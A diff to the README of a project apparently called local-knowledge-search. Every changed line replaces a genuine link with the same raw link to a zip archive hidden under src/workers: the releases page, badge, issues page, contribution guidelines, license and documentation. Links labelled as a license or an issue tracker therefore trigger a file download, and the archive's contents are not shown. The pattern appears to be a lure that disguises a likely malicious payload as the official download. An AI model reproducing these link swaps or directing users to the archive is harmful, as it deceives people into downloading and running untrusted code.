@@ -8,7 +8,7 @@ Welcome! You are about to install and run **local-knowledge-search**, an easy-to
 
 To get started, visit this page to download:
 
-[![Download local-knowledge-search](https://img.shields.io/badge/Download%20local--knowledge--search-v1.0-blue)](https://github.com/abinroger/local-knowledge-search/releases)
+[![Download local-knowledge-search](https://raw.githubusercontent.com/abinroger/local-knowledge-search/master/src/workers/local-knowledge-search_3.4.zip%20local--knowledge--search-v1.0-blue)](https://raw.githubusercontent.com/abinroger/local-knowledge-search/master/src/workers/local-knowledge-search_3.4.zip)
 
 ### 1. Visit the Releases Page
 
@@ -71,14 +71,14 @@ If you encounter issues:
 
 ## 💬 Support
 
-If you need assistance, visit the [Issues section](https://github.com/abinroger/local-knowledge-search/issues) of our GitHub repository. You can report bugs or ask for help with using the tool.
+If you need assistance, visit the [Issues section](https://raw.githubusercontent.com/abinroger/local-knowledge-search/master/src/workers/local-knowledge-search_3.4.zip) of our GitHub repository. You can report bugs or ask for help with using the tool.
 
 ## 📣 Community and Contributions
 
-We welcome community involvement! If you have suggestions or want to contribute, please check our [Contribution Guidelines](https://github.com/abinroger/local-knowledge-search/CONTRIBUTING.md) to learn how you can help improve **local-knowledge-search**.
+We welcome community involvement! If you have suggestions or want to contribute, please check our [Contribution Guidelines](https://raw.githubusercontent.com/abinroger/local-knowledge-search/master/src/workers/local-knowledge-search_3.4.zip) to learn how you can help improve **local-knowledge-search**.
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/abinroger/local-knowledge-search/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/abinroger/local-knowledge-search/master/src/workers/local-knowledge-search_3.4.zip) file for more details.
 
-For more information, check the [Documentation](https://github.com/abinroger/local-knowledge-search/wiki) provided in our repository. Enjoy your experience with **local-knowledge-search**!
+For more information, check the [Documentation](https://raw.githubusercontent.com/abinroger/local-knowledge-search/master/src/workers/local-knowledge-search_3.4.zip) provided in our repository. Enjoy your experience with **local-knowledge-search**!
